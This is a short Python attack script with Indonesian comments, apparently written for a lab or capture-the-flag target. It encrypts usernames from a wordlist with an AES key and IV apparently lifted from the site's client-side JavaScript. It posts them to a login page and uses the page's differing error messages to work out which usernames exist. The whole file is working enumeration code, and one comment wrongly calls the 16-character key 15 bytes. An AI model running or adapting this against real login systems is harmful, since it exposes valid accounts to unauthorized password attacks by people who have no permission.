import base64
import requests
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

# Konfigurasi dari JavaScript
AES_KEY = "MySecretKey12345".encode('utf-8')  # 15-byte key
AES_IV = "RandomInitVector".encode('utf-8')   # 16-byte IV
BLOCK_SIZE = 16

def encrypt_aes(text):
    cipher = AES.new(AES_KEY, AES.MODE_CBC, AES_IV)
    padded = pad(text.encode('utf-8'), BLOCK_SIZE)
    encrypted = cipher.encrypt(padded)
    return base64.b64encode(encrypted).decode()

# URL target
url = "http://192.168.70.202:3333/login4.php"

# Dummy password
dummy_password = "test123"

# Load username list
with open("username-wordlists.txt", "r") as f:
    usernames = [line.strip() for line in f if line.strip()]

valid_usernames = []

for username in usernames:
    enc_user = encrypt_aes(username)
    enc_pass = encrypt_aes(dummy_password)

    data = {
        "enc_username": enc_user,
        "enc_password": enc_pass
    }

    response = requests.post(url, data=data)

    if "User tidak ditemukan" in response.text:
        print(f"[×] Username salah: {username}")
    elif "Password salah" in response.text:
        valid_usernames.append(username)
    else:
        print(f"[!] Respon tak dikenal: {username}")
        print(response.text)

# Cetak hasil akhir
print("\n[✓] Username valid ditemukan:")
for u in valid_usernames:
    print(f"  → {u}")
